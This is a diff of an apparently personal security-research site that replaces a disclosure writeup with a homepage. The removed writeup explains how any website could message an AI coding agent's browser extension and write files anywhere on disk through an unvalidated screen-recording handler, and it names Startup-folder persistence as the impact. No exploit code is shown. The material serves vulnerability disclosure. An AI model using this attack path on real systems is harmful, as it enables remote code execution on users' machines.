@@ -3,324 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zero-Click RCE in Google DeepMind's Antigravity</title>
-    <meta name="description" content="Any website you visit could silently write files anywhere on your system. A critical vulnerability analysis.">
-    <meta name="author" content="Security Research">
-    <meta property="og:title" content="Zero-Click RCE in Google DeepMind's Antigravity">
-    <meta property="og:description" content="Any website you visit could silently write files anywhere on your system.">
-    <meta property="og:type" content="article">
+    <title>Security Research</title>
+    <meta name="description" content="Bug bounty writeups, vulnerability research, and security analysis.">
     <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/panzoom@9.4.3/dist/panzoom.min.js"></script>
-    <script>
-        // Theme-aware Mermaid configuration
-        function getMermaidTheme() {
-            const isDark = document.documentElement.getAttribute('data-theme') !== 'light';
-            return {
-                theme: 'base',
-                themeVariables: isDark ? {
-                    // Dark theme colors - high contrast
-                    primaryColor: '#238636',
-                    primaryTextColor: '#ffffff',
-                    primaryBorderColor: '#3fb950',
-                    lineColor: '#8b949e',
-                    secondaryColor: '#21262d',
-                    tertiaryColor: '#161b22',
-                    background: '#0d1117',
-                    mainBkg: '#21262d',
-                    nodeBorder: '#3fb950',
-                    clusterBkg: '#161b22',
-                    clusterBorder: '#30363d',
-                    titleColor: '#ffffff',
-                    edgeLabelBackground: '#21262d',
-                    // Text colors - ensure white text
-                    textColor: '#ffffff',
-                    nodeTextColor: '#ffffff',
-                    actorTextColor: '#ffffff',
-                    actorBkg: '#21262d',
-                    actorBorder: '#3fb950',
-                    signalColor: '#ffffff',
-                    signalTextColor: '#ffffff',
-                    labelBoxBkgColor: '#21262d',
-                    labelBoxBorderColor: '#30363d',
-                    labelTextColor: '#ffffff',
-                    loopTextColor: '#ffffff',
-                    noteBkgColor: '#21262d',
-                    noteTextColor: '#ffffff',
-                    noteBorderColor: '#58a6ff',
-                    activationBkgColor: '#21262d',
-                    activationBorderColor: '#3fb950',
-                    sequenceNumberColor: '#ffffff',
-                    sectionBkgColor: '#21262d',
-                    altSectionBkgColor: '#161b22',
-                    sectionBkgColor2: '#21262d',
-                    taskBkgColor: '#238636',
-                    taskTextColor: '#ffffff',
-                    taskTextLightColor: '#ffffff',
-                    taskBorderColor: '#3fb950',
-                    gridColor: '#30363d',
-                    doneTaskBkgColor: '#238636',
-                    doneTaskBorderColor: '#3fb950',
-                    critBkgColor: '#f85149',
-                    critBorderColor: '#f85149',
-                    todayLineColor: '#58a6ff',
-                    // State diagram
-                    stateBkg: '#21262d',
-                    stateBorder: '#3fb950',
-                    stateTextColor: '#ffffff',
-                    transitionColor: '#8b949e',
-                    transitionLabelColor: '#ffffff',
-                    // Flowchart specific
-                    flowchartTitleColor: '#ffffff',
-                    subGraphTitleColor: '#ffffff'
-                } : {
-                    // Light theme colors
-                    primaryColor: '#2da44e',
-                    primaryTextColor: '#1f2328',
-                    primaryBorderColor: '#2da44e',
-                    lineColor: '#656d76',
-                    secondaryColor: '#f6f8fa',
-                    tertiaryColor: '#ffffff',
-                    background: '#ffffff',
-                    mainBkg: '#f6f8fa',
-                    nodeBorder: '#2da44e',
-                    clusterBkg: '#f6f8fa',
-                    clusterBorder: '#d0d7de',
-                    titleColor: '#1f2328',
-                    edgeLabelBackground: '#f6f8fa',
-                    textColor: '#1f2328',
-                    nodeTextColor: '#1f2328',
-                    actorTextColor: '#1f2328',
-                    actorBkg: '#f6f8fa',
-                    actorBorder: '#2da44e',
-                    signalColor: '#1f2328',
-                    signalTextColor: '#1f2328',
-                    labelBoxBkgColor: '#f6f8fa',
-                    labelBoxBorderColor: '#d0d7de',
-                    labelTextColor: '#1f2328',
-                    loopTextColor: '#1f2328',
-                    noteBkgColor: '#fff8c5',
-                    noteTextColor: '#1f2328',
-                    noteBorderColor: '#d4a72c',
-                    activationBkgColor: '#f6f8fa',
-                    activationBorderColor: '#2da44e',
-                    sequenceNumberColor: '#ffffff',
-                    stateBkg: '#f6f8fa',
-                    stateBorder: '#2da44e',
-                    stateTextColor: '#1f2328',
-                    transitionColor: '#656d76',
-                    transitionLabelColor: '#1f2328',
-                    flowchartTitleColor: '#1f2328',
-                    subGraphTitleColor: '#1f2328'
-                }
-            };
-        }
-
-        // Initialize Mermaid
-        mermaid.initialize({
-            startOnLoad: false,
-            ...getMermaidTheme(),
-            flowchart: {
-                curve: 'basis',
-                padding: 20,
-                htmlLabels: true,
-                useMaxWidth: false
-            },
-            sequence: {
-                useMaxWidth: false,
-                wrap: true
-            },
-            state: {
-                useMaxWidth: false
-            },
-            securityLevel: 'loose',
-            fontFamily: '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif'
-        });
-
-        // Render diagrams and add zoom functionality
-        async function renderDiagrams() {
-            const diagrams = document.querySelectorAll('.mermaid');
-
-            for (let i = 0; i < diagrams.length; i++) {
-                const diagram = diagrams[i];
-                const code = diagram.textContent || diagram.getAttribute('data-diagram-code');
-
-                // Store original code for re-renders
-                if (!diagram.getAttribute('data-diagram-code')) {
-                    diagram.setAttribute('data-diagram-code', code);
-                }
-
-                const id = `mermaid-diagram-${i}-${Date.now()}`;
-
-                try {
-                    const { svg } = await mermaid.render(id, code);
-                    diagram.innerHTML = svg;
-
-                    // Add zoom controls wrapper
-                    const container = diagram.closest('.diagram-container');
-                    if (container && !container.querySelector('.diagram-controls')) {
-                        // Create controls
-                        const controls = document.createElement('div');
-                        controls.className = 'diagram-controls';
-                        controls.innerHTML = `
-                            <button class="diagram-btn zoom-in" title="Zoom In">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <circle cx="11" cy="11" r="8"></circle>
-                                    <path d="M21 21l-4.35-4.35M11 8v6M8 11h6"></path>
-                                </svg>
-                            </button>
-                            <button class="diagram-btn zoom-out" title="Zoom Out">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <circle cx="11" cy="11" r="8"></circle>
-                                    <path d="M21 21l-4.35-4.35M8 11h6"></path>
-                                </svg>
-                            </button>
-                            <button class="diagram-btn zoom-reset" title="Reset View">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path>
-                                    <path d="M3 3v5h5"></path>
-                                </svg>
-                            </button>
-                            <button class="diagram-btn fullscreen-btn" title="Toggle Fullscreen">
-                                <svg class="expand-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path>
-                                </svg>
-                                <svg class="collapse-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none">
-                                    <path d="M4 14h6v6m10-10h-6V4m0 6l7-7M3 21l7-7"></path>
-                                </svg>
-                            </button>
-                        `;
-                        container.insertBefore(controls, container.firstChild);
-
-                        // Create zoom wrapper
-                        const zoomWrapper = document.createElement('div');
-                        zoomWrapper.className = 'diagram-zoom-wrapper';
-                        diagram.parentNode.insertBefore(zoomWrapper, diagram);
-                        zoomWrapper.appendChild(diagram);
-
-                        // Initialize panzoom
-                        const svgElement = diagram.querySelector('svg');
-                        if (svgElement && typeof panzoom !== 'undefined') {
-                            const pz = panzoom(svgElement, {
-                                maxZoom: 5,
-                                minZoom: 0.3,
-                                initialZoom: 1,
-                                bounds: false,
-                                boundsPadding: 0.1,
-                                smoothScroll: false
-                            });
-
-                            // Store panzoom instance
-                            container.panzoomInstance = pz;
-
-                            // Control button handlers
-                            controls.querySelector('.zoom-in').addEventListener('click', (e) => {
-                                e.stopPropagation();
-                                pz.smoothZoom(svgElement.clientWidth / 2, svgElement.clientHeight / 2, 1.5);
-                            });
-                            controls.querySelector('.zoom-out').addEventListener('click', (e) => {
-                                e.stopPropagation();
-                                pz.smoothZoom(svgElement.clientWidth / 2, svgElement.clientHeight / 2, 0.67);
-                            });
-                            controls.querySelector('.zoom-reset').addEventListener('click', (e) => {
-                                e.stopPropagation();
-                                pz.moveTo(0, 0);
-                                pz.zoomAbs(0, 0, 1);
-                            });
-
-                            // Fullscreen toggle function
-                            const toggleFullscreen = (e) => {
-                                if (e) e.stopPropagation();
-                                const isFullscreen = container.classList.toggle('diagram-fullscreen');
-                                const expandIcon = controls.querySelector('.expand-icon');
-                                const collapseIcon = controls.querySelector('.collapse-icon');
-
-                                if (isFullscreen) {
-                                    document.body.style.overflow = 'hidden';
-                                    expandIcon.style.display = 'none';
-                                    collapseIcon.style.display = 'block';
-                                } else {
-                                    document.body.style.overflow = '';
-                                    expandIcon.style.display = 'block';
-                                    collapseIcon.style.display = 'none';
-                                }
-                                setTimeout(() => {
-                                    pz.moveTo(0, 0);
-                                    pz.zoomAbs(0, 0, 1);
-                                }, 100);
-                            };
-
-                            controls.querySelector('.fullscreen-btn').addEventListener('click', toggleFullscreen);
-
-                            // ESC key to exit fullscreen
-                            container.exitFullscreen = () => {
-                                if (container.classList.contains('diagram-fullscreen')) {
-                                    toggleFullscreen();
-                                }
-                            };
-                        }
-                    }
-                } catch (error) {
-                    console.error('Mermaid render error:', error);
-                    diagram.innerHTML = `<div class="diagram-error">Error rendering diagram: ${error.message}</div>`;
-                }
-            }
-        }
-
-        // Global ESC key handler for fullscreen
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') {
-                const fullscreenContainer = document.querySelector('.diagram-fullscreen');
-                if (fullscreenContainer && fullscreenContainer.exitFullscreen) {
-                    fullscreenContainer.exitFullscreen();
-                }
-            }
-        });
-
-        // Re-render diagrams on theme change
-        function updateDiagramTheme() {
-            // Remove old controls and wrappers before re-render
-            document.querySelectorAll('.diagram-container').forEach(container => {
-                const controls = container.querySelector('.diagram-controls');
-                const wrapper = container.querySelector('.diagram-zoom-wrapper');
-                const mermaidEl = container.querySelector('.mermaid');
-
-                if (controls) controls.remove();
-                if (wrapper && mermaidEl) {
-                    wrapper.parentNode.insertBefore(mermaidEl, wrapper);
-                    wrapper.remove();
-                }
-
-                // Dispose panzoom instance
-                if (container.panzoomInstance) {
-                    container.panzoomInstance.dispose();
-                    container.panzoomInstance = null;
-                }
-            });
-
-            const config = getMermaidTheme();
-            mermaid.initialize({
-                ...config,
-                startOnLoad: false,
-                flowchart: { curve: 'basis', padding: 20, htmlLabels: true, useMaxWidth: false },
-                sequence: { useMaxWidth: false, wrap: true },
-                state: { useMaxWidth: false },
-                securityLevel: 'loose'
-            });
-            renderDiagrams();
-        }
-
-        // Initialize on DOM ready
-        document.addEventListener('DOMContentLoaded', renderDiagrams);
-    </script>
 </head>
-<body>
-    <div class="progress-bar" id="progressBar"></div>
+<body class="home-page">
+    <div class="grain-overlay"></div>
 
-    <nav class="navbar">
+    <nav class="navbar glass">
         <div class="nav-content">
-            <a href="#" class="logo">Security Research</a>
+            <a href="/" class="logo glitch" data-text="SECURITY">SECURITY</a>
             <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
                 <svg class="sun-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <circle cx="12" cy="12" r="5"></circle>
@@ -333,671 +25,204 @@
         </div>
     </nav>
 
-    <article class="article">
-        <header class="article-header">
-            <div class="article-meta">
-                <span class="tag critical">Critical Vulnerability</span>
-                <span class="tag">Zero-Click</span>
-                <span class="tag">RCE</span>
-                <span class="tag">CVSS 9.8</span>
+    <main class="home-container">
+        <!-- Hero Section -->
+        <section class="hero-section">
+            <div class="hero-bg">
+                <div class="grid-lines"></div>
+                <div class="floating-shapes">
+                    <div class="shape shape-1"></div>
+                    <div class="shape shape-2"></div>
+                    <div class="shape shape-3"></div>
+                </div>
             </div>
-            <h1 class="article-title">Zero-Click RCE in Google DeepMind's Antigravity</h1>
-            <p class="article-subtitle">Any website you visit could silently write files anywhere on your system.</p>
-            <div class="article-info">
-                <time datetime="2025-11-27">November 27, 2025</time>
+
+            <div class="hero-content">
+                <div class="profile-image-container">
+                    <div class="profile-ring"></div>
+                    <div class="profile-ring ring-2"></div>
+                    <img src="https://pbs.twimg.com/profile_images/1580828825498595330/F5SsCD7U_400x400.jpg" alt="Profile" class="profile-image">
+                </div>
+
+                <div class="hero-text">
+                    <div class="name-container">
+                        <h1 class="hero-name">
+                            <span class="name-line">hamidonsolo</span>
+                        </h1>
+                        <div class="title-badge">
+                            <span class="badge-dot"></span>
+                            Security Researcher
+                        </div>
+                    </div>
+
+                    <p class="hero-tagline typewriter">Finding bugs. Breaking things. Getting paid.</p>
+
+                    <div class="hero-stats">
+                        <div class="hero-stat">
+                            <div class="stat-value">
+                                <span class="stat-prefix">$</span><span class="stat-number counter" data-target="6000">0</span>
+                            </div>
+                            <span class="stat-desc">Total Earned</span>
+                        </div>
+                        <div class="stat-divider"></div>
+                        <div class="hero-stat">
+                            <span class="stat-number">2</span>
+                            <span class="stat-desc">Writeups</span>
+                        </div>
+                        <div class="stat-divider"></div>
+                        <div class="hero-stat">
+                            <span class="stat-number critical-text">CRITICAL</span>
+                            <span class="stat-desc">Max Severity</span>
+                        </div>
+                    </div>
+
+                    <div class="hero-cta">
+                        <a href="https://x.com/hamidonsolo" target="_blank" rel="noopener" class="cta-button primary">
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="18" height="18">
+                                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                            </svg>
+                            @hamidonsolo
+                        </a>
+                        <a href="#writeups" class="cta-button secondary">
+                            View Writeups
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18">
+                                <path d="M7 17L17 7M17 7H7M17 7V17"/>
+                            </svg>
+                        </a>
+                    </div>
+                </div>
             </div>
-        </header>
 
-        <aside class="toc-container">
-            <div class="toc" id="toc">
-                <h3>Table of Contents</h3>
-                <nav id="tocNav"></nav>
+            <div class="scroll-indicator">
+                <div class="mouse">
+                    <div class="wheel"></div>
+                </div>
+                <span>Scroll</span>
             </div>
-        </aside>
+        </section>
 
-        <div class="article-content">
-            <section id="introduction">
-                <h2>Introduction</h2>
-                <p>AI assistants are evolving beyond simple chatbots. The new generation can see your screen, click buttons, fill forms, and interact with your browser in ways that blur the line between software and user.</p>
-                <p>Google DeepMind's Antigravity is one such tool. It's an AI browser assistant that doesn't just answer questions—it takes action. And with that power comes an expanded attack surface that most security models haven't caught up with.</p>
-                <p>While analyzing Antigravity's browser extension, I discovered a critical vulnerability that allowed any website to write arbitrary files to a user's system. No clicks required. No prompts. No warnings.</p>
-                <div class="callout callout-danger">
-                    <strong>Impact:</strong> Visiting a malicious webpage could drop an executable into your Windows Startup folder, achieving persistent code execution on next reboot.
-                </div>
-            </section>
+        <!-- Writeups Section -->
+        <section class="writeups-section" id="writeups">
+            <div class="section-header">
+                <h2 class="section-title">
+                    <span class="title-accent">//</span> Writeups
+                </h2>
+                <p class="section-subtitle">Vulnerability research & bug bounty reports</p>
+            </div>
 
-            <section id="architecture">
-                <h2>Part 1: Understanding the Full Architecture</h2>
-                <p>Google launched Antigravity IDE on November 18, 2025—a fork of VS Code with AI agents built in. The agents can write code, edit files, run terminal commands, and control a browser.</p>
-
-                <h3>The Entry Point: The Agent's Tools</h3>
-                <pre><code class="language-plaintext">Tool: browser_subagent
-Start a browser subagent to perform actions in the browser with the given task
-description. The subagent has access to tools for both interacting with web page
-content (clicking, typing, navigating, etc) and controlling the browser window
-itself (resizing, etc).
-
-Note: All browser interactions are automatically recorded and saved as WebP
-videos to the artifacts directory.</code></pre>
-
-                <h3>Tracing the Process Tree</h3>
-                <pre><code class="language-bash">$ ps aux | grep Chrome
-/Applications/Google Chrome.app/Contents/MacOS/Google Chrome \
-  --remote-debugging-port=9222 \
-  --user-data-dir=/Users/user/.gemini/antigravity-browser-profile \
-  --disable-fre --no-default-browser-check</code></pre>
-
-                <p>Chrome with <strong>remote debugging enabled on port 9222</strong>. Following the process tree revealed:</p>
-                <pre><code class="language-bash">$ ps -ef | grep language_server
-/Applications/Antigravity.app/.../language_server_macos_arm \
-  --extension_server_port 53410 \
-  --api_server_url http://jetski-server.corp.goog \
-  --csrf_token [REDACTED]</code></pre>
-
-                <p><strong>"Jetski"</strong>—that was the internal codename.</p>
-
-                <div class="table-wrapper">
-                    <table>
-                        <thead><tr><th>Port</th><th>Purpose</th></tr></thead>
-                        <tbody>
-                            <tr><td>53410</td><td>Extension Server (gRPC-Web, CSRF protected)</td></tr>
-                            <tr><td>53412-53413</td><td>LSP channels for code intelligence</td></tr>
-                            <tr><td>9222</td><td>Chrome DevTools Protocol</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-
-                <h3>The Six-Layer Architecture</h3>
-                <p>Through reverse engineering using <code>strings</code> and <code>grep</code> on the binary, I mapped out the complete system architecture:</p>
-                <pre><code class="language-bash"># Extract strings from the language server binary
-$ strings language_server_macos_arm > strings_output.txt
-
-# Search for tool handlers
-$ grep -i "cortex/handlers" strings_output.txt | head -10
-third_party/jetski/cortex/handlers/browser_subagent_handler.go
-third_party/jetski/cortex/handlers/browser_click_element_handler.go
-third_party/jetski/cortex/handlers/browser_press_key_handler.go
-...</code></pre>
-                <div class="diagram-container">
-                    <pre class="mermaid">
-flowchart TB
-    subgraph Layer1["🖥️ Layer 1: User Interface"]
-        IDE["Antigravity IDE<br/>(VS Code Fork)"]
-        User["User Request<br/>'Go to google.com'"]
-    end
-    subgraph Layer2["🧠 Layer 2: AI Inference"]
-        Jetski["Jetski Server<br/>(jetski-server.corp.goog)"]
-        Decision["Gemini Model<br/>Tool Selection"]
-    end
-    subgraph Layer3["⚙️ Layer 3: Language Server (Cortex)"]
-        LS["language_server_macos_arm<br/>Port 53410"]
-        LSFeatures["gRPC-Web Protocol<br/>CSRF Token Required"]
-        Handlers["Tool Handlers<br/>browser_*, fs_*, search_*"]
-    end
-    subgraph Layer4["🔌 Layer 4: MCP Server"]
-        MCP["@anthropic/browser-tools-mcp<br/>HTTP Bridge"]
-    end
-    subgraph Layer5["🔓 Layer 5: Browser Extension"]
-        SW["Service Worker<br/>(service_worker_binary.js)"]
-        Offscreen["Offscreen Document<br/>(offscreen_binary.js)"]
-        Vuln["⚠️ externally_connectable<br/>matches: all_urls"]
-    end
-    subgraph Layer6["🌐 Layer 6: Chrome Browser"]
-        Chrome["Chrome + CDP<br/>Port 9222"]
-        Targets["Debug Targets<br/>/json/list"]
-    end
-    User --> IDE
-    IDE --> Jetski
-    Jetski --> Decision
-    Decision --> LS
-    LS --> LSFeatures
-    LSFeatures --> Handlers
-    Handlers --> MCP
-    MCP --> SW
-    SW --> Offscreen
-    SW --> Vuln
-    Vuln --> Chrome
-    Chrome --> Targets
-    style Vuln fill:#ff6b6b,color:#fff,stroke:#ff6b6b
-    style Handlers fill:#58a6ff,color:#fff
-    style LSFeatures fill:#3fb950,color:#fff
-                    </pre>
-                </div>
-
-                <h3>Complete Communication Flow</h3>
-                <div class="diagram-container">
-                    <pre class="mermaid">
-sequenceDiagram
-    autonumber
-    participant User as 👤 User
-    participant IDE as 🖥️ Antigravity IDE
-    participant AI as 🧠 Jetski/Gemini
-    participant LS as ⚙️ Language Server
-    participant MCP as 🔌 MCP Server
-    participant Ext as 🔓 Extension
-    participant Chrome as 🌐 Chrome CDP
-
-    User->>IDE: "Go to google.com"
-    Note over IDE: Parse user intent
-    IDE->>AI: POST /inference<br/>{"prompt": "..."}
-    Note over AI: Gemini processes<br/>selects tool
-    AI->>IDE: tool_call: browser.open_url<br/>{"Url": "https://google.com"}
-    IDE->>LS: gRPC-Web request<br/>+ CSRF token
-    Note over LS: Cortex state:<br/>CORTEX_STEP_STATUS_RUNNING
-    LS->>MCP: HTTP POST /navigate
-    MCP->>Ext: chrome.runtime.sendMessage()
-    Ext->>Chrome: CDP: Target.createTarget<br/>{"url": "https://google.com"}
-    Chrome-->>Ext: {"targetId": "..."}
-    Note over LS: State: CORTEX_STEP_STATUS_DONE
-    Ext-->>IDE: Success response
-    IDE-->>User: "I opened google.com"
-                    </pre>
-                </div>
-
-                <h3>Cortex State Machine</h3>
-                <p>The Language Server uses a state machine called "Cortex" to manage tool execution. Extracted from the binary:</p>
-                <pre><code class="language-bash"># Extract Cortex states from binary
-$ grep "CORTEX_STEP_STATUS" strings_output.txt
-CORTEX_STEP_STATUS_UNSPECIFIED
-CORTEX_STEP_STATUS_PENDING
-CORTEX_STEP_STATUS_RUNNING
-CORTEX_STEP_STATUS_DONE
-CORTEX_STEP_STATUS_FAILED
-CORTEX_STEP_STATUS_CANCELLED</code></pre>
-                <div class="diagram-container">
-                    <pre class="mermaid">
-stateDiagram-v2
-    [*] --> UNSPECIFIED: Tool call received
-    UNSPECIFIED --> PENDING: Queued for execution
-    PENDING --> RUNNING: Handler invoked
-    RUNNING --> DONE: Success
-    RUNNING --> FAILED: Error occurred
-    RUNNING --> CANCELLED: User cancelled
-    DONE --> [*]
-    FAILED --> [*]
-    CANCELLED --> [*]
-
-    note right of RUNNING
-        Tool handlers execute here:
-        • browser_* handlers
-        • fs_* handlers
-        • terminal_* handlers
-        • SaveScreenRecording ⚠️
-    end note
-
-    note right of FAILED
-        Failures logged to:
-        third_party/jetski/cortex/
-        handlers/*_handler.go
-    end note
-                    </pre>
-                </div>
-                <div class="callout callout-info">
-                    <strong>Handler Locations:</strong> Each tool has a dedicated handler file in <code>third_party/jetski/cortex/handlers/</code>. For example, <code>browser_click_element_handler.go</code> handles click operations.
-                </div>
-
-                <h3>The Complete Tool Arsenal (27+ Tools)</h3>
-                <p>Using <code>strings</code> and <code>grep</code> on the binary revealed the complete tool registry with their JSON schemas:</p>
-                <pre><code class="language-bash"># Extract tool argument parsing
-$ grep -A 20 "ParseToolArgs" strings_output.txt
-type BrowserOpenUrlArgs struct {
-    Url string `json:"Url"`
-}
-type BrowserClickElementArgs struct {
-    Element int `json:"Element"`
-}
-type FsWriteFileArgs struct {
-    Path    string `json:"Path"`
-    Content string `json:"Content"`
-}</code></pre>
-
-                <div class="diagram-container">
-                    <pre class="mermaid">
-flowchart TB
-    subgraph BrowserTools["🌐 Browser Tools (8)"]
-        direction TB
-        BOU["browser.open_url<br/>─────────────<br/>Url: string"]
-        BCE["browser.click_element<br/>─────────────<br/>Element: int"]
-        BPK["browser.press_key<br/>─────────────<br/>Key: string"]
-        BIN["browser.input<br/>─────────────<br/>Text: string"]
-        BGD["browser.get_dom<br/>─────────────<br/>(no args)"]
-        BCS["browser.capture_screenshot<br/>─────────────<br/>(no args)"]
-        BEJ["browser.execute_javascript<br/>─────────────<br/>Code: string"]
-        BSD["browser.scroll_down<br/>─────────────<br/>Amount: int"]
-    end
-    subgraph FileTools["📁 File System Tools (6)"]
-        direction TB
-        FSV["fs.view_file_range<br/>─────────────<br/>Path: string<br/>StartLine: int<br/>EndLine: int"]
-        FSL["fs.list_directory<br/>─────────────<br/>Path: string"]
-        FSW["fs.write_file<br/>─────────────<br/>Path: string<br/>Content: string"]
-        FSM["fs.move_file<br/>─────────────<br/>Source: string<br/>Dest: string"]
-        FSC["fs.copy_file<br/>─────────────<br/>Source: string<br/>Dest: string"]
-        FSD["fs.delete_file<br/>─────────────<br/>Path: string"]
-    end
-    subgraph TerminalTools["⌨️ Terminal Tools (3)"]
-        direction TB
-        TRD["terminal.read<br/>─────────────<br/>Id: string"]
-        TWR["terminal.write<br/>─────────────<br/>Id: string<br/>Command: string"]
-        TKL["terminal.kill<br/>─────────────<br/>Id: string"]
-    end
-    subgraph SearchTools["🔍 Search & Web (5)"]
-        direction TB
-        SIF["search.in_file<br/>─────────────<br/>Query: string<br/>Path: string"]
-        SFN["search.file_name<br/>─────────────<br/>Query: string"]
-        WSE["web.search<br/>─────────────<br/>Query: string"]
-        HRU["http.read_url<br/>─────────────<br/>Url: string"]
-        MWF["mcp.web_fetch<br/>─────────────<br/>Url: string"]
-    end
-    subgraph OtherTools["🔧 Other Tools (5)"]
-        direction TB
-        BDR["browser.drag<br/>─────────────<br/>FromElement: int<br/>ToX: int, ToY: int"]
-        BSA["browser_subagent<br/>─────────────<br/>Task: string"]
-        AUD["audio.play<br/>─────────────<br/>Path: string"]
-        IMG["image.analyze<br/>─────────────<br/>Path: string"]
-        CLB["clipboard.read<br/>─────────────<br/>(no args)"]
-    end
-    style FSW fill:#ff6b6b,color:#fff
-    style BEJ fill:#ffa94d,color:#000
-    style TWR fill:#ffa94d,color:#000
-                    </pre>
-                </div>
-
-                <div class="callout callout-info">
-                    <strong>Key Finding:</strong> Tools like <code>fs.write_file</code>, <code>browser.execute_javascript</code>, and <code>terminal.write</code> are high-risk primitives that can achieve code execution when combined with the extension vulnerability.
-                </div>
-            </section>
-
-            <section id="red-flag">
-                <h2>Part 2: The First Red Flag</h2>
-                <pre><code class="language-json">{
-  "externally_connectable": {
-    "matches": ["&lt;all_urls&gt;"]
-  }
-}</code></pre>
-                <div class="callout callout-warning">
-                    This means <strong>every website on the internet</strong> can send messages directly to this extension.
-                </div>
-            </section>
-
-            <section id="attack-surface">
-                <h2>Part 3: Mapping the Attack Surface</h2>
-                <p>Analyzing the extension's message handlers revealed the complete attack surface:</p>
-                <pre><code class="language-bash"># Find message handlers in the extension
-$ grep -E "case|action.*:" service_worker_binary.js
-case 11: // SaveScreenRecording
-case 12: // rpcCall
-case 13: // getCurrentTabId
-case 14: // CHECK_JETSKI_CONNECTION</code></pre>
-
-                <div class="diagram-container">
-                    <pre class="mermaid">
-flowchart TB
-    subgraph External["🌐 External Attack Surface"]
-        Website["evil.com<br/>─────────────<br/>Any website on internet"]
-        Payload["Malicious Payload<br/>─────────────<br/>za: byte array<br/>filename: string<br/>L: path component"]
-        API["chrome.runtime.sendMessage()<br/>─────────────<br/>extensionId: 'eeijfnjm...'"]
-    end
-    subgraph Extension["🔓 Browser Extension (Vulnerable)"]
-        Manifest["manifest.json<br/>─────────────<br/>externally_connectable:<br/>matches: ['&lt;all_urls&gt;']"]
-        Handler["qh Handler<br/>─────────────<br/>⚠️ NO sender validation<br/>⚠️ NO origin check"]
-        Router["Action Router<br/>─────────────<br/>Switch on action type"]
-    end
-    subgraph Actions["📋 Exposed Actions"]
-        A1["rpcCall<br/>─────────────<br/>cancelCascade<br/>Risk: Low"]
-        A2["SaveScreenRecording<br/>─────────────<br/>⚠️ Arbitrary file write<br/>Risk: CRITICAL"]
-        A3["getCurrentTabId<br/>─────────────<br/>Returns tab info<br/>Risk: Low"]
-        A4["CHECK_JETSKI_CONNECTION<br/>─────────────<br/>Leak connection status<br/>Risk: Medium"]
-    end
-    subgraph Backend["⚙️ Backend Processing"]
-        Proto["Protobuf Message<br/>─────────────<br/>Qg message builder<br/>Fields: za, filename, L"]
-        LS["Language Server<br/>─────────────<br/>Port 53410<br/>gRPC-Web endpoint"]
-        FS["File System<br/>─────────────<br/>⚠️ No path sanitization<br/>⚠️ Path traversal possible"]
-    end
-    Website --> Payload --> API
-    API --> Manifest --> Handler --> Router
-    Router --> A1
-    Router --> A2
-    Router --> A3
-    Router --> A4
-    A2 --> Proto --> LS --> FS
-    style A2 fill:#ff6b6b,color:#fff,stroke:#ff6b6b
-    style Handler fill:#ffa94d,color:#000
-    style Manifest fill:#ffa94d,color:#000
-    style FS fill:#ff6b6b,color:#fff
-    style Payload fill:#58a6ff,color:#fff
-                    </pre>
-                </div>
-
-                <div class="table-wrapper">
-                    <table>
-                        <thead><tr><th>Action</th><th>Handler</th><th>Purpose</th><th>Parameters</th><th>Risk</th></tr></thead>
-                        <tbody>
-                            <tr><td><code>rpcCall.cancelCascade</code></td><td>case 12</td><td>Cancel running automation</td><td>None</td><td class="risk-low">Low</td></tr>
-                            <tr><td><code>getCurrentTabId</code></td><td>case 13</td><td>Get active tab identifier</td><td>None</td><td class="risk-low">Low</td></tr>
-                            <tr><td><code>CHECK_JETSKI_CONNECTION</code></td><td>case 14</td><td>Check Language Server status</td><td>None</td><td class="risk-medium">Info Leak</td></tr>
-                            <tr><td><code>SaveScreenRecording</code></td><td>case 11</td><td>Write file to disk</td><td>za, filename, L</td><td class="risk-critical">CRITICAL</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </section>
-
-            <section id="vulnerability">
-                <h2>Part 4: The Vulnerability</h2>
-                <p>The <code>SaveScreenRecording</code> handler accepts:</p>
-                <ul>
-                    <li><code>za</code> — File contents as a byte array</li>
-                    <li><code>filename</code> — The name of the file</li>
-                    <li><code>L</code> — A path component</li>
-                </ul>
-                <pre><code class="language-plaintext">C:\Users\{username}\.gemini\antigravity\brain\{L}\{filename}</code></pre>
-                <div class="callout callout-danger">
-                    <strong>Critical Issue:</strong> The handler never validates who sent the message.
-                </div>
-
-                <div class="diagram-container">
-                    <pre class="mermaid">
-flowchart LR
-    subgraph Expected["Expected Flow"]
-        E1["Offscreen Doc"] -->|"Internal"| E2["Service Worker"] -->|"Verified"| E3["Disk"]
-    end
-    subgraph Actual["Actual Flow"]
-        A1["Any Website"] -->|"External"| A2["Service Worker"] -->|"No check!"| A3["Disk"]
-    end
-    style E1 fill:#3fb950,color:#fff
-    style A1 fill:#ff6b6b,color:#fff
-    style A2 fill:#ffa94d,color:#000
-                    </pre>
-                </div>
-
